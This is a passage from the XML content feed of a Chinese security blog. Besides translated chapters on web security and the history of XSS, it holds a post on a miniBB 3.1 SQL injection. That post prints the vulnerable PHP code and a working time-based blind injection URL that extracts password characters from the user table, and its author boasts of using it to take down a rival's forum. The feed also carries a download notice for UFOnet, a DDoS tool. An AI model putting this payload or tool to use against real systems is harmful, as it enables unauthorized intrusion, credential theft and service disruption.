<p>Web为八亿网民提供了场所，是一亿网站之家以及每天具有数十亿美金的传输。作为全球化的一个现象，国际贸易已经依赖于互联网。这距离电子邮件、留言板、聊天室、网上拍卖、网上购物、网上新闻、网上银行以及其他网络软件成为我们生活中的一部分，并没有花多长时间。现在，用户交出了他的姓名、住址、社保号、信用卡信息、电话号码、母亲的婚前姓氏，年薪、出生日期有时甚至是他最喜欢的颜色或者是幼儿园老师的名字来接受财政声明、纳税记录或者每天的现货贸易。并且就像我前面提到的，十分之八的网站有严重的安全问题使得你的数据很危险。甚至是最安全的系统也在被新的最近被定义为”Web应用安全”的问题困扰着。</p>
<h2 id="正文">正文</h2>
<p>收集个人信息及隐私的组织有义务保护数据，由于Web应用安全问题变得越来越重要，我们需要更认真的去思考这个问题。我们面对的已经不仅仅是相对惹人烦的认证窃取，脚本小子入侵以及全部公开的滑稽。新的具有控制全国电网、操作水利发电大坝、开处方、管理大多数美国公司的工资名单、使用企业内网或者管理其他相当重要功能的网站上线。考虑一下，如果这些系统被恶意渗透的会是怎么样。很难想象信息安全有如此重要。Web应用如今已成为系统渗透中最简单直接且最引人注目的方法。</p>
<p>直到最近，每个人认为防火墙、SSL、免打扰系统、网络扫描器以及密码是网络安全的解决办法。安全教授从高筑墙的军事思想得到启发，建立黑白名单。对于大部分，这种策略是很有效的，可是Web和电子商务改变了这种状况。电子商务需要防火墙允许Web（80端口的HTTP和443端口的HTTPS）传输，似乎是一夜之间互联网从有墙的网络变成了全球的电子商务市场。墙不再是密不透风的，安全管理员发现他们没办法保护这个不安全的Web应用。</p>
<p>Web开发者现在在创造激发电子商务的应用的同时也对网络安全负责。基础的软件设计原则不得不随之改变。变革之前的经验是大部分软件只有一个相对较少的用户数量。开发者现在创造出可以在网络服务器上运行的应用，任何人在任何地点都可以得到。他们软件传播的数量和范围以指数增加，由此安全问题也加剧了。现在全球数亿用户可以直接访问公司的服务器，其中可能就有一部分是恶意的敌人。新的事由例如XSS，SQL注入以及数十种新的基于Web的攻击需要处理。</p>
<p>图1.1 漏洞层级<br><img src="http://bugorg.qiniudn.com/b11.png" alt="漏洞层级"></p>
<h2 id="web应用包含">web应用包含</h2>
<p>Web应用安全是一个包含很多法则、技术、设计理念的话题，通常我们感兴趣的领域是如图1.1中从服务器往上的软件层面。这包括应用服务器例如JBoss，IBM WebSphere，BEA WebLogic以及其余1000多个。然后我们前进到一些商业的或者开源的Web应用，像PHP Nuke，Microsoft Outlook Web Access以及ASP。这些之后就是内部定制的Web应用。这一层是Web应用安全的重灾区。</p>
<h2 id="结尾">结尾</h2>
<p>Web应用开发者不得不考虑的最严重的威胁之一是XSS攻击。虽然XSS是Web安全中相对较小的一部分，但是它可能是关于用户的最危险的。一个很小的bug可能导致浏览器弱点，借助此攻击者可以窃取数据，了解用户的浏览历史或者其余更多的事情。<br>讽刺的是，许多人不理解XSS攻击的危害以及他是怎样被用来攻击普通受害者的。这本书的目标就是通过一系列的讨论、例子和证据来教育读者了解XSS的重要性。</p>
]]></content>
         
         
           
             
              <breadCrumb title="知识百科" url="http://www.weshell.net/categories/%E7%9F%A5%E8%AF%86%E7%99%BE%E7%A7%91/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/one-xss.html</loc>
    <lastmod>2015-01-02T11:41:02.000Z</lastmod>
    <data>
        <display>
        <title>跨站脚本原理</title>
        <pubTime>2014-03-16T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="历史背景">历史背景</h2>
<p>跨站脚本攻击可以追溯到1996年，万维网(World Wide Web)刚发明的时候。那是一个电子商务刚刚起步，页是网景、雅虎等公司的气泡时期。数以千计的网页正在采用HTML框架构建中。然后JavaScript就出现了，它导致了跨站的出现，永远改变了Web应用安全。JavaScript使得Web开发者可以创建采用图像轮转、浮动菜单以及弹窗等交互式网站。虽然和今天的Asynchronous JavaScript和XML（AJAX）应用标准比起来很普通，但是很快黑客就发现了这片新大陆。</p>
<p>黑客们发现，当可信任用户浏览网站时，他们可以在同一个浏览器窗口里强制加载任何网站（银行、拍卖、商店、邮箱等等）到一个HTML框架。然后他们可以跨过两个网站间的分界线并且从一个框架里读取数据到另一个。他们可以窃取存在HTML表格中的用户名与密码、cookies或者屏幕上的机密信息。媒体以浏览器漏洞报道了这个问题。网景公司作为当时主要的浏览器厂商实施了同源政策(same-origin policy)。同源政策限制了JavaScript从一个网站获取另外网站的数据。浏览器黑客们认为这是一个挑战，然后想出了很多聪明的办法攻破这个限制。</p>
<p>1999年12月，David Ross正在研究IE浏览器的安全相应问题。David受到也在寻找IE安全问题的Georgi Guninski工作的启发，他演示了网站内容的脚本注入（”Script Injection”），但是这个问题似乎只存在IE浏览器的服务端，在客户端并不存在。David在微软内部发表了一篇题为”Script Injection”的paper。这篇论文描述了这种情况，以及其发现过程，如何借助cookies攻击，跨站脚本（XSS）病毒如何运行，以及对此种情况的I/O过滤办法。</p>
<p>最后这个内容被分享到CERT(译者注：computer emergency response team)。他这么做的目的是以一种负责人的方式通知公众这种情况，从而使得在整个行业内的网站得到修复而不仅仅是微软的。再一次一月中旬的讨论中，这个组织从下面一系列相当幽默的建议中选择了”Cross Site Scripting”，</p>
<p>未授权网站脚本(Unauthorized Site Scripting)<br>非官方网站脚本(Unofficial Site Scripting)<br>URL参数脚本注入(Uniform Resource Locator(URL) Parameter Script Insertion)<br>跨站脚本(Cross-site Scripting)<br>合成脚本(Synthesized Scripting)<br>脚本欺骗(Fraudulent Scripting)<br>在2000年1月25日，微软在华盛顿的贝尔维尤的一个酒店约见CERT，相关厂商（例如Apache）和其余一些感兴趣的组织一起讨论这个概念。</p>
<p>David在Ivan Brugiolo、John Coates和Michael Roe的帮助下又重新写了这篇内部论文，以使得它适合公开。以和CERT协调，微软在2000年2月公开了这篇论文以及其他材料。过去几年的某天，这篇论文被从Microsoft.com上移除了，但是没有东西会在互联网上消失。我们现在可以在ttp://ha.ckers.org/cross-site-scripting.html找到他。</p>
<p>同时，黑帽子们为了感染用户在HTML聊天室、留言板、访客记录、邮件等任何地方提交包含HTML/JavaScript的文本，这就是这种攻击叫做HTML注入的来源。黑客们创造了一种基本的JavaScript恶意软件模型，他们提交这些代码以改变屏幕名称，显示讽刺信息，窃取cookies，改变网站页面颜色，显示病毒警告和其他一些不具有很明显恶意的危害。不久之后另一种攻击变种出现了，通过社会工程学，欺骗用户去点击一个特殊装饰的恶意链接也可以导致和HTML注入相同的结果，Web用户除了关闭JavaScript没有别的办法自卫。</p>
<p>那些年原来被认为是跨站脚本的漏洞变成了一个没有特殊名字的浏览器漏洞。HTML注入和恶意链接现在被分类为跨站脚本的变种，反射型跨站脚本和存储型跨站脚本。不幸的是这就是许多人弄不清这些术语的原因。更糟的是，”CSS”这个缩写与一个新诞生的浏览器技术Cascading Style Sheets弄混。最后在2000年早期，一个聪明人提议用”XSS”代替跨站脚本的缩写来避免混乱。然后就像我们知道的，它流传了下来，XSS有了自己的身份。几十篇描述他破坏性的论文和海量的漏洞利用建议充斥着网络。可很少有人听。</p>
<p>直到2005年，大量的安全专家和开发者都很少注意XSS。他们主要关注缓冲区溢出，僵尸网络，病毒，蠕虫病毒，间谍软件等等。同时全球每个月有100万新的网络服务器出现，他们有着脆弱的防火墙并且认为Secure Sockets Layer(SSL)是很奇怪的东西。更多的人认为使得XSS出现的JavaScript是一门玩具编程语言。”它不能获得操作系统的root权限或者exploit数据库，所以为什么我需要关心呢？点击一个链接或者参观一个网址能有多危险呢？”在2005年10月我们得到了答案。Samy Worm，第一个XSS蠕虫关闭了著名的社交网站MySpace。它的payload是相对温和的，Samy Worm被设计从一个MySpace用户的个人主页感染另一个用户，最终在短短24小时内感染了100万用户。安全世界惊醒了，然后JavaScript恶意程序的研究开始广泛开展起来。</p>
<p>短短几个月后，在2006年，JavaScript端口扫描器，攻破内网，按键记录，木马，浏览器历史记录窃取出现了并且产生了持续的影响。在主要网站的数百个XSS漏洞被揭露出来，犯罪分子开始以假冒身份来进行欺骗。毫不奇怪的，根基WhiteHat Security的记录，超过70%的网站现在是可利用的。MITRE的公共漏洞披露(CVE)项目是一个在商业软件或者开源软件中公开漏洞的集合，它标明XSS已经超过缓冲区泄漏成为被发现最多的漏洞。理所当然地，面对信息安全和电子商务，XSS成了潜在地最具有破坏性的漏洞。今天，当观众被问到是否听说过XSS时，几乎所有人都会举手。</p>
]]></content>
         
         
           
             
              <breadCrumb title="知识百科" url="http://www.weshell.net/categories/%E7%9F%A5%E8%AF%86%E7%99%BE%E7%A7%91/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/about.html.html</loc>
    <lastmod>2015-01-02T04:55:06.000Z</lastmod>
    <data>
        <display>
        <title>博客声明</title>
        <pubTime>2014-03-16T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<div class="alert alert-danger"><i class="fa fa-bug"></i>  <p>1.在未经授权下，禁止复制、传播、转载、发行本博客内容.<br>2.本博客内容仅供学习参考使用，文章作者及站点拥有者不对其承担任何法律责任.<br>3.任何单位或个人认为通过本网站网页内容可能涉嫌侵犯其著作权，应该及时向我们提出书面权利通知.<br>4.任何人因使用本网站而可能遭致的意外及其造成的损失，我们对此概不负责，亦不承担任何法律责任.<br>5.当您浏览本站时将默认且认同此条款.<br>6.最终解释权归安全天使（www.weshell.net以及其他附属域名）所有.</p>
</div>]]></content>
         
         
           
             
              <breadCrumb title="关于博客" url="http://www.weshell.net/categories/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/links.html</loc>
    <lastmod>2015-01-02T04:54:54.000Z</lastmod>
    <data>
        <display>
        <title>友情链接</title>
        <pubTime>2014-03-16T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<div class="alert alert-success"><i class="fa fa-lightbulb-o"></i>  <p>AQ1：本博客欢迎所有相关站点申请有情链接<br>AQ2：您的站点不能带有明显跨地域攻击言词<br>AQ3：您的站点内容务必遵守天朝管制条例<br>AQ4：您的站点内容不能是大面积复制或采集<br>AQ5：您的站点如果带有DDOS/抓鸡/刷砖/请立即按下ALT+F4<br>AQ6：您的站点域名可以是免费域名，只要您的站点内容质量够好</p>
</div>]]></content>
         
         
           
             
              <breadCrumb title="关于博客" url="http://www.weshell.net/categories/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/onepeloe.html</loc>
    <lastmod>2015-01-01T14:49:22.000Z</lastmod>
    <data>
        <display>
        <title>观一个人的武林有感</title>
        <pubTime>2015-01-01T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="前言">前言</h2>
<p>这是我搬到Github上来手写的第一篇文章，在DW下写的，我也算是服了自己<br><a id="more"></a></p>
<h2 id="正文">正文</h2>
<p>昨天因为没有看到跨年晚会，所以今天打开优酷准备回放一下，突然看到一篇《一个人的武林》的评论，写的非常nice，所以我就果断打开观看发现竟然要会员，蛋疼就跑去下了种子看，全片的主体就是在现代社会一个武痴到处找人比武杀人，被JC通缉，却又抓不到最后又去请了一个在监狱里的高手区KILL他，总体而言剧情非常老套，但是特效比较好，细节也感人肺腑，好吧，我是容易被感动的人…</p>
<h2 id="感想">感想</h2>
<p>这个片子从侧面告诉了我们凡事不要去力争第一，为此你会失去很多本该属于你的快乐，平平谈谈陪在爱的人身边才是最真。<br>我非常喜欢王宝强演的这个角色，也能感受到剧中他亲手杀掉爱的人的痛苦，但是我不明白的是这和他杀人有什么关系，导演穿插的也是真烂。  </p>
]]></content>
         
         
           
             
              <breadCrumb title="生活琐事" url="http://www.weshell.net/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E4%BA%8B/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/mylife-yifu.html</loc>
    <lastmod>2015-01-01T08:12:58.000Z</lastmod>
    <data>
        <display>
        <title>吐槽一下我姨夫</title>
        <pubTime>2014-03-16T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="引子">引子</h2>
<p>今天是我表哥结婚的第三天，家乡风俗是必须要去外婆家吃饭的，于是就上演了一幕让我喷饭的故事。<br><a id="more"></a></p>
<h2 id="起因">起因</h2>
<p>  吃饭时刚好二姨夫也来了，说是和外公商量他家土地的事，起因是因为他们那里需要建一个工业园，刚好二姨夫有几十亩土地在那里（百万富豪有木有），需要占用他家的地，赔偿的问题都已经谈好了。就是他家房子没有谈好，二姨夫要求领导在原地给建一栋别墅，否则一分土地都别想拿走，领导大家都懂的，怎么可能让他装起来的钱给吐出来，领导称不可能、没商量。这时候二姨夫做出了让我喷饭的事，立马跑回家装了摄像头，写了上访信，直接跑去省里信访办，这时候被市里的给半路拦了下来（①最后讲一下市里面为什么会知道），最后又被JC给带了回来，高chao来了，姨夫直接跑去市政的抱着某领导的车轮就不放，说要不解决好就打给天朝巡视组，这下领导们慌了神，说原地不可能盖，让我二姨夫自己挑一块地，只要土地主人愿意，想盖哪就盖哪，证件什么的给免费办齐全，哈哈，简直把我笑死了，其实我们市里的领导们还是比较好的，不像其他地区。</p>
<h2 id="1-解答">1.解答</h2>
<p>网监为什么会找到你<br>  ①市里为什么会知道我二姨夫要去上访了，其实很简单，每个地方都有网监而且与电信部门合作可以监控一些关键词，比如上访之类的，二姨夫就是因为之前用了他本机的IP在百度查询相关单位，就被网监上报给JC了，其实只要用了类似洋葱路由、代理通道、跳板之类的工具，JC就查不到你了，当然不是绝对的，那要看他们的耐心、成本是否足够</p>
]]></content>
         
         
           
             
              <breadCrumb title="生活琐事" url="http://www.weshell.net/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E4%BA%8B/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/my-life.html</loc>
    <lastmod>2015-01-01T08:11:06.000Z</lastmod>
    <data>
        <display>
        <title>miniBB 3.1 SQL注入漏洞</title>
        <pubTime>2014-03-16T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="前提概要">前提概要</h2>
<p>这个洞不是我挖的，是一个外国友人的一篇文章，起因是某装B黑客站长扬言要撸我好基友的博客，顿时我就不乐意了，好好的，别人不惹你、你惹别人。于是就和好基友马不停蹄的到处找0day，因为minibb的程序很小，安全性也非常高，撸翻的几率很小，社工是走不通的，因为现在很多人的安全意识都提高了。正在这时谷歌上的一篇文章吸引了我的注意，于是我就XXXXXXXXXXXXXXXXXX就撸翻了装B黑客论坛，哈哈，不多讲，咱看代码：<br><a id="more"></a></p>
<h2 id="代码分析">代码分析</h2>
<div class="alert alert-danger"><i class="fa fa-bug"></i>  <p>File: bb_func_unsub.php<br>$usrid=(isset($_GET[‘usrid’])?$_GET[‘usrid’]+0:0);<br>$allowUnsub=FALSE;<br>$chkCode=FALSE;<br>if(isset($_GET[‘code’]) and preg_match(“#[a-zA-Z0-9]+#”, $_GET[‘code’])){<br>    //trying to unsubscribe directly from email<br>    $chkField=’email_code’;<br>    $chkVal=$_GET[‘code’];<br>    $userCondition=TRUE;<br>    $chkCode=TRUE;<br>}<br>else{<br>    //manual unsubsribe<br>    $chkField=’user_id’;<br>    $chkVal=$user_id;<br>    $userCondition=($usrid==$user_id);<br>}<br> if ($topic!=0 and $usrid&gt;0 and $userCondition and $ids=db_simpleSelect(0, $Ts, ‘id, user_id’, ‘topic_id’, ‘=’, $topic, ‘’, ‘’, $chkField, ‘=’, $chkVal))</p>
</div>

<h2 id="示例">示例</h2>
<div class="alert alert-warning"><i class="fa fa-bell"></i>  <p>1-1ttp://xxxxx/index.php?action=unsubscribe&amp;usrid=1&amp;topic=1&amp;code=test’ UNION SELECT 1, IF(substr(user_password,1,1) = CHAR(99), SLEEP(5), 0) FROM minibbtable_users WHERE user_id = 1 AND username != </p>
</div>]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/ufonet.html</loc>
    <lastmod>2015-01-01T07:54:10.000Z</lastmod>
    <data>
        <display>
        <title>UFOnet4.0基于python的URL重定向DDOS工具</title>
        <pubTime>2014-03-16T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<div class="alert alert-danger"><i class="fa fa-bug"></i>  <p>UFOnet4.0基于python的URL重定向DDOS工具<br>开源免费，欢迎下载 [ 2014.12.19 ]<br>特性：利用第三方开放接口来XXX，其他涉及XX管制条例，自行体验<br>MD5：b1c569e4e7f757a7232bd14692c90894 [ 下载后注意核对 ]<br>下载：【使劲撸这里】</p>
</div>]]></content>
         
         
           
             
              <breadCrumb title="神兵利器" url="http://www.weshell.net/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
          
        </display>
    </data>
    </url>

</urlset>
